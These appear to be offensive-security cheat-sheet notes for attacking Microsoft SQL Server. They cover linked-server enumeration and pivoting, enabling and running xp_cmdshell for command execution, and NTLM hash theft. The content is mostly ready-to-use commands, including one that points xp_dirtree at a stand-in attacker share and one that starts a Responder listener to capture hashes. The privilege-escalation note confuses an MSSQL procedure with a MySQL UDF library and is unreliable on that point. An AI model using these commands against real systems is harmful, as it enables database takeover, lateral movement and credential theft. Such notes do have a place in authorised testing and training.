vectors: xpcmd, linked server pivot, hash steal, sql user impersonation

### Linked Server Enumeration

```sql

-- List linked servers

SELECT srvname, isremote FROM sysservers;

GO

```

- `isremote = 1` remote server

- `isremote = 0` trusted linked server
### Check Users & Privileges

```sql
-- Current user

SELECT user_name();

-- List status and admins
SELECT name, sysadmin FROM syslogins;

```

  

### Run Queries on Linked Servers

```sql

-- Run query on linked server

EXEC ('SELECT current_user') AT [<DOMAIN>\<CONFIG_FILE>];

EXEC ('SELECT srvname,isremote FROM sysservers') AT [<DOMAIN>\<CONFIG_FILE>];

EXEC ('EXEC (''SELECT suser_name()'')') AT [<DOMAIN>\<CONFIG_FILE>];

```

---

### 1. Test `xp_cmdshell`

```sql

EXEC sp_configure 'show advanced options', 1;

RECONFIGURE;

EXEC sp_configure; -- check if xp_cmdshell is enabled

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;

EXEC xp_cmdshell "whoami";

```


### 2. Enable `xp_cmdshell` (if permitted)

```sql

EXEC sp_configure 'show advanced options', 1;

RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;

```

---

## Privilege Escalation

- `xp_regwrite` can use User Defined Functions (UDFs) for execution (rare in prod).

- Example: [`lib_mysqludf_sys`](https://github.com/mysqludf/lib_mysqludf_sys).
---

  

## Linked Servers (Pivoting)
  

- Linked servers let SQL execute queries on remote DBs.

- Example:

```sql

EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin''))') AT [10.0.0.12\SQLEXPRESS];

```

---
  
## Hash Theft (Relay MSSQL)

  

- Use **undocumented procs**: `xp_dirtree`, `xp_subdirs`.
- These trigger **SMB auth** then use procedures to create/write files.

---

  
# Cheat Sheet
  

- **Enum linked servers:** `SELECT srvname,isremote FROM sysservers;`

- **Check users:** `SELECT user_name();` / `SELECT name, sysadmin FROM syslogins;`

- **Linked server exec:** `EXEC('SELECT suser_name()') AT [server];`

- **Test cmd exec:** `xp_cmdshell "whoami";`

- **Enable xp_cmdshell:** `sp_configure 'xp_cmdshell',1; RECONFIGURE;`

- **Steal hash:** `EXEC master..xp_dirtree '\attacker\share\';`

- **Responder listener:** `sudo responder -I tun0`

- **Enable file write:** `sp_configure 'Ole Automation Procedures',1; RECONFIGURE;`